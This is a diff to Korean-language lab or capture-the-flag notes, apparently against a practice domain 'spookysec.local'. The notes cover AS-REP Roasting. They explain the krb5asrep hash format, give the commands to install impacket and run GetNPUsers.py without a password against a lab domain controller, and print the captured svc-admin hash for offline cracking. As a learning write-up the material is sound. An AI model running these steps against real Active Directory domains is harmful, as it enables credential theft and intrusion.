@@ -325,3 +325,46 @@ $krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:eb7960f3000af4f080ea83a3bfcecf85$72c40a3
 2025/07/06 07:00:12 >  Done! Tested 73317 usernames (16 valid) in 252.886 seconds
 
 # svc-admin 계정은 Pre-Auth가 필요하지 않으므로 AS-REP Roasting이 가능합니다. 이 계정의 해시를 오프라인에서 크랙할 수 있습니다.
+
+$krb5asrep$<etype>$<username>:<checksum>$<encrypted blob>
+
+| 항목                                 | 내용                             | 설명                                                  |
+| ---------------------------------- | ------------------------------ | --------------------------------------------------- |
+| `$krb5asrep$`                      | 고정 접두어                         | 해시 타입 식별자 (AS-REP Roasting용)                        |
+| `18`                               | 암호화 알고리즘 (etype)               | `18 = aes256-cts-hmac-sha1-96`<br> → AES 256-bit 사용 |
+| `svc-admin@SPOOKYSEC.LOCAL`        | 사용자 Principal 이름               | 공격 대상 사용자                                           |
+| `eb7960f3000af4f080ea83a3bfcecf85` | 체크섬 (Checksum)                 | 티켓 데이터의 무결성 검사용 (크랙에는 필요 없음)                        |
+| `72c4...cd98`                      | 암호화된 데이터 (Encrypted Data Blob) | 실제로 크랙 대상이 되는 부분                                    |
+
+
+# impacket 사용
+
+sudo apt update
+sudo apt install python3-pip python3-venv -y
+
+python3 -m venv impacket-env
+source impacket-env/bin/activate
+
+git clone https://github.com/fortra/impacket.git
+cd impacket
+
+pip install -r requirements.txt
+python3 setup.py install
+
+cd impacket/examples
+
+# username 하나씩 넣어보면서 AS-REP Roasting 가능한지 확인
+python3 GetNPUsers.py spookysec.local/USERNAME -no-pass -dc-ip 10.10.206.91
+python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.206.91
+
+
+# TGT 요청
+
+┌──(impacket-env)─(kali㉿vbox)-[~/impacket/examples]
+└─$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
+/home/kali/impacket-env/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c5bdd5ab26d92c6f285bcc6d298177cc$90400cd95569b00649925f20b7462f510c4bf7928fc8704eee5c9add8febc9ad1cc4b63ad9aae1c2c66bc0fb5711d975ee4245cee843bb89cc04f0e7b1728e1ce84cb61feaaf8a7d5a5bdb83e1be7647fea8fb807e10228f25e424be86dec12edb634af6d4a08399fc921a0e062fa72de2095774ea0885ada3c5ca2392ec75f0606f53b181bcf03aae3d0efd337782322aa7c828445a7834402c0a931259e18010dccce3f54a04e40fb37fe6b5e7962ce9f4074f33a42d9a354079c3c8b07c0bef4fef7af65437b0b93bb0810bae9eb407cf962552dcef42e43688e6a5cb8544c3bc4ae854cfa1da1a14088ffae1fa1f7b1b
